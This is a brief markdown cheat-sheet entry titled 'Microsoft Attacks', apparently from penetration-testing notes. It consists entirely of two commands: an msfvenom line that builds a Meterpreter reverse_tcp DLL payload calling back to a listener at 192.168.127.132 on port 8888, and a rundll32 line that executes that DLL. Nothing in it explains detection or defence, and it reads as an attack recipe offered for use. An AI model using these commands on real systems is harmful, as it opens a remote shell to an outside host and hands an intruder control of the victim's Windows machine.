# Microsoft Attacks

### Execute Malicious DLL with Rundll32
- Generate shared library (DLL) with Metasploit
```console
msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.127.132 lport=8888 -f dll -o payload.dll
```
- Execute the malicious DLL with rundll32
```console
rundll32.exe shell32.dll,Control_RunDLL payload.dll
```
